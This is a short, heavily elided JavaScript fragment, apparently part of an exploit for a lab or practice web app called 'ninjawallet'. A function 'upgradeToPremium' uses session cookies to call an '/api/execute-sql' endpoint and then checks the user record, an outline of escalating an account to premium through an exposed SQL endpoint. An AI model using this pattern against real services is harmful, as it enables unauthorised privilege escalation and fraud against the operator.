...
async function upgradeToPremium() {
  try {
    ...
    const userBefore = await fetch('https://ninjawallet.ninja/api/users/me', {
      headers: {
        Cookie: cookies
      }
    }).then(res => res.json());
    ...
    await fetch('https://ninjawallet.ninja/api/execute-sql', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Cookie: cookies
    ...
    // Verify the update
    const userAfter = await fetch('https://ninjawallet.ninja/api/users/me', {
      headers: {
        Cookie: cookies
      }
    }).then(res => res.json());
